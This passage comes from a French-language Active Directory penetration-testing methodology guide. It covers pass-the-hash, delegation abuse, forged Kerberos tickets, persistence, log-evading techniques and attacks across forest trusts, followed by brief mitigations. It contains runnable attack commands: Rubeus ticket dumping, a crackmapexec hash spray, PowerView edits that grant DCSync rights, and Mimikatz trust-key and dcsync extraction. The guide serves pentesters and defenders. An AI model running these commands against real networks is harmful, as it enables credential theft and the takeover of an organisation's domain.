### Connexion à distance (RDP, SSH, FTP, Win-RM, etc.)

Une fois que vous avez obtenu des identifiants, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** afin de tenter de vous connecter à plusieurs serveurs avec différents protocoles, en fonction des ports détectés lors de vos scans.

### Élévation locale de privilèges

Si vous avez compromis des identifiants ou une session en tant qu’utilisateur de domaine standard et que vous pouvez accéder à **n’importe quelle machine du domaine**, cherchez un moyen d’**élever vos privilèges localement et de collecter des identifiants**. Des privilèges d’administrateur local peuvent vous permettre de **récupérer les hashes d’autres utilisateurs** depuis la mémoire (LSASS) et le stockage local (SAM).

Ce livre contient une page complète sur l’[**élévation locale de privilèges dans Windows**](../windows-local-privilege-escalation/index.html) ainsi qu’une [**checklist**](../checklist-windows-privilege-escalation.md). Pensez également à utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la session actuelle

Il est **très peu probable** que vous trouviez dans les **tickets** de l’utilisateur actuel des autorisations vous permettant d’accéder à des ressources inattendues, mais vous pouvez vérifier :

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Avec des identifiants de domaine ou une session utilisateur, revisitez les [**attaques de relay NTLM**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) : les techniques d’énumération authentifiée et de coercition peuvent révéler des chemins de relay indisponibles lors de la reconnaissance sans authentification.

### Recherche de creds dans les partages d’ordinateurs | Partages SMB

Maintenant que vous avez quelques identifiants de base, vérifiez si vous pouvez **trouver** des **fichiers intéressants partagés au sein de l’AD**. Vous pouvez le faire manuellement, mais c’est une tâche très répétitive et ennuyeuse (d’autant plus si vous trouvez des centaines de documents à vérifier).

[**Suivez ce lien pour découvrir les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Voler des creds NTLM

Si vous pouvez **accéder à d’autres PC ou partages**, vous pouvez **y placer des fichiers** (comme un fichier SCF) qui, s’ils sont consultés, **déclencheront une authentification NTLM auprès de vous**, ce qui vous permettra de **voler** le **challenge NTLM** afin de le cracker :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Élévation de privilèges sur Active Directory AVEC des identifiants/une session privilégiés

**Pour les techniques suivantes, un utilisateur de domaine standard ne suffit pas : vous avez besoin de privilèges ou d’identifiants spécifiques pour effectuer ces attaques.**

### Extraction des hashes

Vous avez peut-être réussi à **compromettre un compte d’administrateur local** à l’aide d’[AsRepRoast](asreproast.md), du [Password Spraying](password-spraying.md), de [Kerberoast](kerberoast.md), de [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), y compris le relay, d’[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) ou de l’[élévation de privilèges locale](../windows-local-privilege-escalation/index.html).\
Il est ensuite temps de dumper tous les hashes présents en mémoire et sur le système local.\
[**Consultez cette page pour découvrir différentes façons d’obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d’un utilisateur**, vous pouvez l’utiliser pour **vous faire passer pour lui**.\
Vous devez utiliser un **outil** qui **effectuera** l’**authentification NTLM à l’aide de** ce **hash**, **ou** créer un nouveau **sessionlogon** et **injecter** ce **hash** dans **LSASS**, afin que ce **hash soit utilisé lors de toute authentification NTLM**. C’est cette dernière méthode qu’utilise mimikatz.\
[**Consultez cette page pour plus d’informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque consiste à **utiliser le hash NTLM de l’utilisateur pour demander des tickets Kerberos**, comme alternative à la méthode courante Pass The Hash via le protocole NTLM. Elle peut donc être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** comme protocole d’authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d’attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d’authentification d’un utilisateur** au lieu de son mot de passe ou de ses hashes. Ce ticket volé est ensuite utilisé pour **se faire passer pour l’utilisateur** et obtenir un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Réutilisation des identifiants

Si vous avez le **hash** ou le **mot de passe** d’un **administrateur local**, essayez de **vous connecter localement** à d’autres **PC** avec ces identifiants.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Notez que cela génère beaucoup de **bruit** et que **LAPS** permettrait de l’**atténuer**.

### Abus de MSSQL et liens de confiance

Si un utilisateur dispose des privilèges nécessaires pour **accéder à des instances MSSQL**, il pourrait être en mesure d’**exécuter des commandes** sur l’hôte MSSQL (si l’instance s’exécute en tant que SA), de **voler** le **hash** NetNTLM, voire de mener une **attaque** par **relay**.\
Si une instance MSSQL est approuvée par une autre instance via un lien de base de données, un utilisateur disposant de privilèges sur la base de données liée pourrait **utiliser cette relation de confiance pour exécuter des requêtes sur l’autre instance**. Ces relations de confiance peuvent être chaînées et finir par mener à une base de données mal configurée sur laquelle l’utilisateur peut exécuter des commandes.\
**Les liens entre bases de données fonctionnent également à travers les relations d’approbation de forêt.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abus des plateformes de gestion des actifs informatiques et de déploiement

Les suites tierces d’inventaire et de déploiement exposent souvent des moyens puissants d’accéder aux identifiants et d’exécuter du code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l’attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous disposez de privilèges de domaine sur cet ordinateur, vous pourrez extraire de la mémoire les TGT de tous les utilisateurs qui s’y connectent.\
Ainsi, si un **Domain Admin se connecte à l’ordinateur**, vous pourrez extraire son TGT et usurper son identité à l’aide de [Pass the Ticket](pass-the-ticket.md).\
Grâce à la délégation contrainte, vous pourriez même **compromettre automatiquement un serveur d’impression** (espérons qu’il s’agisse d’un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un utilisateur ou un ordinateur est autorisé pour la « Constrained Delegation », il pourra **usurper l’identité de n’importe quel utilisateur pour accéder à certains services sur un ordinateur**.\
Ainsi, si vous **compromettez le hash** de cet utilisateur ou de cet ordinateur, vous pourrez **usurper l’identité de n’importe quel utilisateur** (y compris les administrateurs de domaine) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Disposer du privilège **WRITE** sur un objet Active Directory d’un ordinateur distant permet d’obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abus des permissions/ACL

L’utilisateur compromis pourrait disposer de **privilèges intéressants sur certains objets du domaine**, qui pourraient vous permettre de vous **déplacer** latéralement et d’**escalader** vos privilèges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abus du service Printer Spooler

La découverte d’un **service Spool en écoute** au sein du domaine peut être **exploitée** pour **obtenir de nouveaux identifiants** et **escalader les privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abus des sessions de tiers

Si **d’autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des identifiants depuis la mémoire** et même d’**injecter des beacons dans leurs processus** pour usurper leur identité.\
Les utilisateurs accèdent généralement au système via RDP. Voici donc comment mener quelques attaques sur les sessions RDP de tiers :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système de gestion du **mot de passe de l’administrateur local** sur les ordinateurs joints au domaine, afin de garantir qu’il soit **aléatoire**, unique et fréquemment **modifié**. Ces mots de passe sont stockés dans Active Directory et l’accès est contrôlé par des ACL, de sorte que seuls les utilisateurs autorisés puissent y accéder. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d’autres ordinateurs.


{{#ref}}
laps.md
{{#endref}}

### Vol de certificats

La **récupération de certificats** depuis la machine compromise peut permettre d’escalader les privilèges au sein de l’environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abus des modèles de certificats

Si des **modèles vulnérables** sont configurés, il est possible de les exploiter pour escalader les privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation avec un compte à privilèges élevés

### Extraction des identifiants du domaine

Une fois que vous avez obtenu les privilèges **Domain Admin**, ou mieux encore **Enterprise Admin**, vous pouvez **extraire** la **base de données du domaine** : _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Une archive de sauvegarde lisible contenant `ntds.dit` ainsi que la ruche `SYSTEM` doit être considérée comme contenant des données d’annuaire exposées, même avant son extraction. Le fait qu’un hash de mot de passe soit obsolète ne signifie pas que les autres attributs de l’objet sont sûrs : des champs tels que `description` peuvent contenir des identifiants ou des notes opérationnelles. Examinez d’abord les noms des membres de l’archive et évitez d’inclure le contenu de la base de données extraite dans les sorties d’énumération courantes.

### Privesc comme mécanisme de persistance

Certaines des techniques évoquées précédemment peuvent servir à assurer la persistance.\
Par exemple, vous pourriez :

- Rendre des utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Rendre les utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Accorder à un utilisateur des privilèges [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

L’**attaque Silver Ticket** crée un ticket **Ticket Granting Service (TGS)** **légitime** pour un service spécifique à l’aide du **hash NTLM** (par exemple, le **hash du compte de l’ordinateur**). Cette méthode sert à **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **attaque Golden Ticket** consiste pour un attaquant à obtenir le **hash NTLM du compte krbtgt** dans un environnement Active Directory (AD). Ce compte est particulier, car il sert à signer tous les **Ticket Granting Tickets (TGT)**, indispensables à l’authentification au sein du réseau AD.

Une fois ce hash obtenu, l’attaquant peut créer des **TGT** pour n’importe quel compte de son choix (attaque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Il s’agit de tickets similaires aux golden tickets, forgés de manière à **contourner les mécanismes courants de détection des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistance avec les certificats d’un compte**

**Posséder les certificats d’un compte ou pouvoir en demander** est un très bon moyen de maintenir la persistance dans le compte d’un utilisateur (même s’il change son mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistance avec les certificats du domaine**

**Les certificats permettent également de maintenir la persistance avec des privilèges élevés dans le domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Groupe AdminSDHolder

L’objet **AdminSDHolder** dans Active Directory assure la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **Access Control List (ACL)** standard à ces groupes afin d’empêcher les modifications non autorisées. Cette fonctionnalité peut toutefois être exploitée : si un attaquant modifie l’ACL d’AdminSDHolder pour accorder un accès complet à un utilisateur standard, celui-ci obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, conçue pour protéger, peut donc se retourner contre l’organisation et permettre un accès indu si elle n’est pas surveillée de près.

[**Plus d’informations sur le groupe AdminDSHolder ici.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Identifiants DSRM

Chaque **Domain Controller (DC)** possède un compte **administrateur local**. En obtenant des droits d’administrateur sur une telle machine, il est possible d’extraire le hash de l’administrateur local avec **mimikatz**. Il faut ensuite modifier le registre pour **activer l’utilisation de ce mot de passe**, ce qui permet d’accéder à distance au compte Administrateur local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistance par ACL

Vous pouvez **accorder** à un **utilisateur** des **autorisations spéciales** sur certains objets du domaine, ce qui lui permettra **d’élever ses privilèges ultérieurement**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descripteurs de sécurité

Les **descripteurs de sécurité** servent à **stocker** les **autorisations** qu’un **objet** possède **sur** un autre **objet**. Une simple **modification** du **descripteur de sécurité** d’un objet peut vous conférer des privilèges très intéressants sur celui-ci, sans qu’il soit nécessaire d’appartenir à un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objets dynamiques : anti-forensics / évasion

Abusez de la classe auxiliaire `dynamicObject` pour créer des principaux/GPO/enregistrements DNS à durée de vie courte avec `entryTTL`/`msDS-Entry-Time-To-Die` ; ils s’autosuppriment sans tombstones, effaçant les preuves LDAP tout en laissant des SID orphelins, des références `gPLink` rompues ou des réponses DNS mises en cache (par exemple, pollution des ACE d’AdminSDHolder ou redirections malveillantes via `gPCFileSysPath`/DNS intégré à AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifiez **LSASS** en mémoire pour établir un **mot de passe universel**, donnant accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personnalisé

[Découvrez ici ce qu’est un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **clair** les **identifiants** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Cette technique enregistre un **nouveau Domain Controller** dans l’AD et l’utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiques, **sans** laisser de **journaux** concernant les **modifications**. Vous **devez disposer des privilèges DA** et vous trouver dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des journaux plutôt gênants apparaîtront.

{{#ref}}
dcshadow.md
{{#endref}}

### Persistance LAPS

Nous avons déjà vu comment élever ses privilèges si vous disposez d’**autorisations suffisantes pour lire les mots de passe LAPS**. Ces mots de passe peuvent toutefois également servir à **maintenir la persistance**.\
Consultez :


{{#ref}}
laps.md
{{#endref}}

## Élévation de privilèges dans une forêt - approbations de domaine

Microsoft considère la **forêt** comme la frontière de sécurité. Cela implique que **la compromission d’un seul domaine pourrait entraîner celle de toute la forêt**.<sup>[[1]](#references)</sup>

### Informations de base

Une [**approbation de domaine**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d’un **domaine** d’accéder aux ressources d’un autre **domaine**. Elle établit un lien entre les systèmes d’authentification des deux domaines, permettant aux vérifications d’authentification de s’effectuer de manière transparente. Lorsque des domaines établissent une approbation, ils échangent et conservent des **clés** spécifiques sur leurs **Domain Controllers (DC)**, lesquelles sont essentielles à l’intégrité de l’approbation.

Dans un scénario classique, si un utilisateur veut accéder à un service d’un **domaine approuvé**, il doit d’abord demander un ticket spécial appelé **TGT inter-realm** au DC de son propre domaine. Ce TGT est chiffré avec une **clé** partagée convenue entre les deux domaines. L’utilisateur présente ensuite ce TGT au **DC du domaine approuvé** afin d’obtenir un ticket de service (**TGS**). Après validation du TGT inter-realm par le DC du domaine approuvé, celui-ci délivre un TGS qui accorde à l’utilisateur l’accès au service.

**Étapes** :

1. Un **ordinateur client** du **domaine 1** lance le processus en utilisant son **hash NTLM** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 délivre un nouveau TGT si l’authentification du client réussit.
3. Le client demande ensuite un **TGT inter-realm** à DC1, nécessaire pour accéder aux ressources du **domaine 2**.
4. Le TGT inter-realm est chiffré avec une **clé d’approbation** partagée entre DC1 et DC2 dans le cadre de l’approbation bidirectionnelle entre les deux domaines.
5. Le client transmet le TGT inter-realm au **Domain Controller du domaine 2 (DC2)**.
6. DC2 vérifie le TGT inter-realm à l’aide de la clé d’approbation partagée et, s’il est valide, délivre un **Ticket Granting Service (TGS)** pour le serveur du domaine 2 auquel le client veut accéder.
7. Enfin, le client présente ce TGS au serveur, où il est chiffré avec le hash du compte du serveur, afin d’accéder au service du domaine 2.

### Différents types d’approbation

Il est important de noter qu’**une approbation peut être unidirectionnelle ou bidirectionnelle**. Dans le cas d’une approbation bidirectionnelle, les deux domaines se font mutuellement confiance. Dans le cas d’une approbation **unidirectionnelle**, l’un des domaines est le domaine **approuvé** et l’autre, le domaine **qui fait confiance**. Dans ce dernier cas, **vous ne pourrez accéder aux ressources du domaine qui fait confiance que depuis le domaine approuvé**.

Si le domaine A fait confiance au domaine B, A est le domaine qui fait confiance et B est le domaine approuvé. De plus, dans le **domaine A**, il s’agit d’une **approbation sortante** ; et dans le **domaine B**, d’une **approbation entrante**.

**Différents types de relations d’approbation**

- **Approbations parent-enfant** : configuration courante au sein d’une même forêt, dans laquelle un domaine enfant possède automatiquement une approbation transitive bidirectionnelle avec son domaine parent. Ainsi, les demandes d’authentification peuvent circuler sans interruption entre le parent et l’enfant.
- **Approbations de liaison croisée** : appelées « approbations de raccourci », elles sont établies entre des domaines enfants pour accélérer les processus d’orientation. Dans les forêts complexes, les orientations d’authentification doivent généralement remonter jusqu’à la racine de la forêt, puis redescendre vers le domaine cible. La création de liaisons croisées raccourcit ce trajet, ce qui est particulièrement utile dans les environnements géographiquement dispersés.
- **Approbations externes** : elles sont établies entre des domaines distincts et sans lien, et ne sont pas transitives par nature. Selon la [documentation de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les approbations externes permettent d’accéder aux ressources d’un domaine situé hors de la forêt actuelle et qui n’est pas relié par une approbation de forêt. Le filtrage SID renforce la sécurité des approbations externes.
- **Approbations de racine d’arborescence** : ces approbations sont automatiquement établies entre le domaine racine de la forêt et une nouvelle racine d’arborescence. Bien que peu courantes, elles sont importantes pour ajouter de nouvelles arborescences de domaines à une forêt, leur permettre de conserver un nom de domaine unique et assurer la transitivité bidirectionnelle. Pour en savoir plus, consultez le [guide de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Approbations de forêt** : ce type d’approbation transitive bidirectionnelle relie les domaines racines de deux forêts et applique également le filtrage SID pour renforcer la sécurité.
- **Approbations MIT** : elles sont établies avec des domaines Kerberos non-Windows conformes à la [RFC4120](https://tools.ietf.org/html/rfc4120). Les approbations MIT sont plus spécialisées et répondent aux besoins des environnements qui doivent s’intégrer à des systèmes basés sur Kerberos hors de l’écosystème Windows.

#### Autres différences entre les **relations d’approbation**

- Une relation d’approbation peut également être **transitive** (A fait confiance à B, B fait confiance à C, donc A fait confiance à C) ou **non transitive**.
- Une relation d’approbation peut être configurée comme **bidirectionnelle** (les deux domaines se font mutuellement confiance) ou **unidirectionnelle** (un seul domaine fait confiance à l’autre).

### Chemin d’attaque

1. **Énumérez** les relations d’approbation.
2. Vérifiez si un **principal de sécurité** (utilisateur/groupe/ordinateur) a **accès** aux ressources de **l’autre domaine**, éventuellement par le biais d’entrées ACE ou parce qu’il appartient à des groupes de l’autre domaine. Recherchez les **relations entre domaines** (c’est probablement pour cela que l’approbation a été créée).
   1. Dans ce cas, kerberoast peut être une autre option.
3. **Compromettez** les **comptes** qui peuvent servir de **pivot** entre les domaines.

Les attaquants pourraient accéder aux ressources d’un autre domaine par trois principaux mécanismes :

- **Appartenance à un groupe local** : des principaux peuvent être ajoutés à des groupes locaux sur des machines, par exemple au groupe « Administrateurs » d’un serveur, ce qui leur donne un contrôle important sur cette machine.
- **Appartenance à un groupe d’un domaine externe** : des principaux peuvent également appartenir à des groupes du domaine externe. L’efficacité de cette méthode dépend toutefois de la nature de l’approbation et de la portée du groupe.
- **Listes de contrôle d’accès (ACL)** : des principaux peuvent être spécifiés dans une **ACL**, notamment en tant qu’entités dans des **ACE** au sein d’une **DACL**, ce qui leur donne accès à des ressources spécifiques. Pour approfondir le fonctionnement des ACL, DACL et ACE, le livre blanc intitulé « [An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf) » est une ressource précieuse.<sup>[[17]](#references)</sup>

### Trouver les utilisateurs/groupes externes disposant d’autorisations

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les principaux de sécurité externes du domaine. Il s’agira d’utilisateurs/groupes d’un **domaine/forêt externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou avec powerview :

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Autres façons d’énumérer les relations d’approbation de domaine :

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Il existe **2 clés approuvées**, l’une pour _Enfant --> Parent_ et l’autre pour _Parent_ --> _Enfant_.\
> Vous pouvez trouver celle utilisée par le domaine actuel avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Élever ses privilèges au rang d’administrateur d’entreprise dans le domaine enfant/parent en exploitant la relation d’approbation avec SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploiter un Configuration NC accessible en écriture

Comprendre comment le Configuration Naming Context (NC) peut être exploité est crucial. Le Configuration NC sert de référentiel central pour les données de configuration dans une forêt Active Directory (AD). Ces données sont répliquées sur chaque contrôleur de domaine (DC) de la forêt, et les DC accessibles en écriture conservent une copie modifiable du Configuration NC. Pour l’exploiter, il faut disposer des privilèges **SYSTEM sur un DC**, de préférence un DC enfant.

**Lier une GPO au site du DC racine**

Le conteneur Sites du Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine dans la forêt AD. Avec les privilèges SYSTEM sur n’importe quel DC, les attaquants peuvent lier des GPO aux sites du DC racine. Cette action peut compromettre le domaine racine en modifiant les stratégies appliquées à ces sites.

Pour approfondir le sujet, consultez les recherches sur [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromettre n’importe quel gMSA de la forêt**

Une méthode d’attaque consiste à cibler les gMSA privilégiés du domaine. La clé racine KDS, indispensable au calcul des mots de passe des gMSA, est stockée dans le Configuration NC. Avec les privilèges SYSTEM sur n’importe quel DC, il est possible d’accéder à la clé racine KDS et de calculer les mots de passe de n’importe quel gMSA de la forêt.

Vous trouverez une analyse détaillée et des instructions étape par étape dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque complémentaire contre les MSA délégués (BadSuccessor – exploitation des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherche externe complémentaire : [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Attaque par modification du schéma**

Cette méthode demande de la patience : il faut attendre la création de nouveaux objets AD privilégiés. Avec les privilèges SYSTEM, un attaquant peut modifier le schéma AD pour accorder à n’importe quel utilisateur le contrôle total de toutes les classes. Cela peut entraîner un accès non autorisé aux nouveaux objets AD et leur prise de contrôle.

Pour en savoir plus, consultez [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA à EA avec ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets d’infrastructure à clés publiques (PKI) afin de créer un modèle de certificat permettant de s’authentifier en tant que n’importe quel utilisateur de la forêt. Comme les objets PKI se trouvent dans le Configuration NC, la compromission d’un DC enfant accessible en écriture permet de lancer des attaques ESC5.

Pour plus de détails, consultez [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En l’absence d’ADCS, l’attaquant peut mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domaine de forêt externe - unidirectionnelle (entrante) ou bidirectionnelle

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Dans ce scénario, **votre domaine est approuvé** par un domaine externe, ce qui vous confère des **autorisations indéterminées** sur celui-ci. Vous devrez trouver **quels principaux de votre domaine disposent de quels accès au domaine externe**, puis tenter de les exploiter :

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - à sens unique (sortant)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Dans ce scénario, **votre domaine** **accorde** certains **privilèges** à un principal de **domaines différents**.

Cependant, lorsqu’un **domaine est approuvé** par le domaine qui accorde la confiance, le domaine approuvé **crée un utilisateur** avec un **nom prévisible** et utilise comme **mot de passe le mot de passe de confiance**. Cela signifie qu’il est possible d’**accéder à un utilisateur du domaine qui accorde la confiance pour pénétrer dans le domaine approuvé**, l’énumérer et tenter d’escalader davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine approuvé consiste à trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans le **sens opposé** à celui de la relation d’approbation entre domaines (ce qui est assez rare).

Une autre façon de compromettre le domaine approuvé consiste à attendre sur une machine où un **utilisateur du domaine approuvé peut se connecter** via **RDP**. L’attaquant pourrait alors injecter du code dans le processus de la session RDP et **accéder au domaine d’origine de la victime** depuis cet environnement.\
De plus, si la **victime a monté son disque dur**, l’attaquant pourrait, depuis le processus de la **session RDP**, déposer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s’appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation de l’abus des relations d’approbation de domaine

### **SID Filtering :**

- Le risque d’attaques exploitant l’attribut SID history à travers les relations d’approbation entre forêts est atténué par le SID Filtering, activé par défaut sur toutes ces relations. Cette mesure repose sur l’hypothèse que les relations d’approbation au sein d’une forêt sont sûres, la forêt — plutôt que le domaine — étant considérée comme la frontière de sécurité, conformément à la position de Microsoft.
- Il y a toutefois un inconvénient : le SID Filtering peut perturber les applications et l’accès des utilisateurs, ce qui conduit parfois à sa désactivation.

### **Selective Authentication :**

- Pour les relations d’approbation entre forêts, le recours à Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas authentifiés automatiquement. Des autorisations explicites sont requises pour que les utilisateurs accèdent aux domaines et aux serveurs de la forêt ou du domaine qui accorde la confiance.
- Il est important de noter que ces mesures ne protègent pas contre l’exploitation du writable Configuration Naming Context (NC) ni contre les attaques visant le compte de confiance.

[**Plus d’informations sur les relations d’approbation de domaine sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abus d’AD basé sur LDAP depuis des implants on-host

